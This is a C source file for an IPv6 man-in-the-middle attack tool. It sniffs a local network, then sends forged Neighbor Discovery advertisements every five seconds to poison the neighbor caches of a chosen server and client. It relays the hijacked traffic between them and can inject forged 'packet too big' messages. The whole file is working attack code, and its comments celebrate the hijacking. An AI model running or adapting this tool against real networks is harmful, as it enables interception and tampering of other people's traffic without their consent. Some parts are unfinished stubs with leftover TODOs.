#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

#include <netinet/if_ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>

#include <device.h>
#include <packets.h>
#include <communication.h>

#define DEBUG 0

int sniff;
int opt_log, opt_verbose, opt_pkt2big;
pthread_t pid0;

void termination_handler(int signum) {
	/* TODO */
	printf("\nSig: %d\nFree everything\n", signum);
	close(sniff);
	free(cvictim); //FIXME: free all the attributes??
	exit(0);
}

void *poison(void *destination) {
	struct victim *dst = (struct victim *)destination;
	char *pkt1, *pkt2;

	if (!victim_info_complete(dst) || !victim_info_complete(&svictim)) {
		printf("Victim not loaded correctly.\n");
		pthread_exit(NULL);
	}

	printf("Starting Client and Server poisoning\n");
	debug_cvivtim(dst);

	pkt1 = alloc_ndadvert(&svictim, dst);
	pkt2 = alloc_ndadvert(dst, &svictim);

	while (1) {
		/* Poison client */
		send_packet(pkt1);
		/* Poison server */
		send_packet(pkt2);
		sleep(5);
	}
	/* FIXME: Memleaks */
	free(pkt1);
	free(pkt2);
	pthread_exit(NULL);
}

void get_victims(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct nd_neighbor_solicit *nd;

	eth = (struct ethhdr *)packet;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
		icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));

		if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
			if (memcmp(&svictim.hwaddr, &eth->h_source, ETH_ALEN) != 0) {
				memcpy(&(svictim.hwaddr), &(eth->h_source), ETH_ALEN);
				printf("Gotcha: %s\n", ether_ntoa(&svictim.hwaddr));
			}
		} else if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
			nd = (struct nd_neighbor_solicit *)icmpv6;
			if (!memcmp(&nd->nd_ns_target, &svictim.ipv6, sizeof(struct in6_addr))) {
				if (!victim_info_complete(cvictim))
					populate_cvictim(packet);
				if (!cvictim->poisoned) {
					printf("Thread de poison para o client.\n");
					pthread_create(&pid0, NULL, poison, cvictim) ;
				}
			}
		}
	}
}

void packet_action(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct tcphdr *tcp;
	char *pkt;

	eth = (struct ethhdr *)packet;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
		if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
			printf("Packet Hijacked from client to server? >:-)\n");
			if (opt_verbose)
				debug_packet(packet);
			fake_packet(packet, &svictim);
			send_packet(packet);
			/* TODO */
			switch (ip6->ip6_nxt) {
				case IPPROTO_ICMPV6:
					icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
					break;
				case IPPROTO_TCP:
					tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
					break;
				default:
					break;
			}
		} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
			if (!memcmp(&(ip6->ip6_dst), &(cvictim->ipv6), sizeof(struct in6_addr))) {
				printf("Packet Hijacked from server to client? >:-)\n");
				if (opt_verbose)
					debug_packet(packet);

				fake_packet(packet, cvictim);
				send_packet(packet);
				if (opt_pkt2big) {
					pkt = alloc_pkt2big(cvictim, &svictim, ip6);
					send_packet(pkt);
					if (pkt)
						free(pkt);
				}

				/* Pacote enviado pela nossa vitima. */
				switch (ip6->ip6_nxt) {
					case IPPROTO_ICMPV6:
						icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
						/* TODO */
						break;
					case IPPROTO_TCP:
						tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
						/* TODO */
						break;
				}
			}
		}
	}
}

int main(int argc, char **argv) {
	struct sockaddr_ll packet_info;
	struct sigaction saction;
	char packet_buffer[2048];
	int packet_info_size = sizeof(packet_info);
	int len, c;
	char *iface = NULL, *address = NULL;

	/* Set up the structure to specify the new action. */
	saction.sa_handler = termination_handler;
	sigemptyset(&saction.sa_mask);
	saction.sa_flags = 0;

	sigaction(SIGINT, &saction, NULL);

	opt_log = 0;
	opt_verbose = 0;
	opt_pkt2big = 0;
	opterr = 0;

	while ((c = getopt(argc, argv, "lvbd:i:")) != -1) {
		switch (c) {
			case 'l':
				opt_log = 1;
				break;
			case 'v':
				/* Verbose */
				opt_verbose = 1;
				break;
			case 'b':
				opt_pkt2big = 1;
				/* send packet too big */
				break;
			case 'd':
				address = optarg;
				break;
			case 'i':
				iface = optarg;
				break;
			case '?':
				printf("Usage: %s -i <interface> -d <victim's address>\n" \
						"\t-l \tLog hijacked packets\n" \
						"\t-v \tVerbose\n" \
						"\t-l \tSend \"packet too big\" to attacked server\n", argv[0]);
				return 1;
			default:
				abort();
		}
	}

	if (!address || !iface) {
		printf("Usage: %s -i <interface> -d <victim's address>\n" \
				"\t-l \tLog hijacked packets\n" \
				"\t-v \tVerbose\n" \
				"\t-l \tSend \"packet too big\" to attacked server\n", argv[0]);
		return 0;
	}

	load_device_info(iface);
	dump_device_info();

	sniff = get_promisc_socket(device.name);
	init_svictim(address);
	init_cvictim();

	while ((len = recvfrom(sniff, packet_buffer, 2048, 0,
			(struct sockaddr*)&packet_info,
			(socklen_t *)&packet_info_size)) >= 0) {

		if (!victim_info_complete(&svictim) || !victim_info_complete(cvictim))
			get_victims(packet_buffer);
		else
			packet_action(packet_buffer);
	}

	return 0;
}
